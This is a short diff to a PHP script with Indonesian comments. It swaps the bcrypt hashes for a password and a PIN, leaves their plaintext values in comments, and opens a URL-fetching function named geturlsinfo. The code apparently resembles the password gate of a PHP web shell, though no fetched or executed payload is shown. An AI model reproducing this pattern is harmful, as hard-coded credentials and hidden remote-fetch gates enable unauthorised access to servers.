@@ -8,8 +8,8 @@ define('SECURE_ACCESS', true);
 header('X-Powered-By: none');
 header('Content-Type: text/html; charset=UTF-8');
 
-$hashed_password = '$2y$10$9EBntP.qUR1tJC7UGC0kX.FL6laakKDDHJRqdEPwOSEByIHzkJUXu'; // bcrypt dari 'rahasia123'
-$hashed_pin = '$2y$10$rqwdtNxQOXHb7DRdtAKEN.EWaMz4k34QKDotYVeJligaOuOSlhlyi'; // bcrypt dari '246810'
+$hashed_password = '$2y$10$U8XqpJyVaKzkQj84vt8ebONaDCvGeWDHyVgE5CBCOb/T7/A1riFcq'; // bcrypt dari 'rahasia123'
+$hashed_pin = '$2y$10$TMRwPMOUQbkVQdIHAMG8X.6M4ekPM9EIJrcolTe0xMR.nG6o.cwny'; // bcrypt dari '246810'
 
 function geturlsinfo($url) {
     if (function_exists('curl_exec')) {
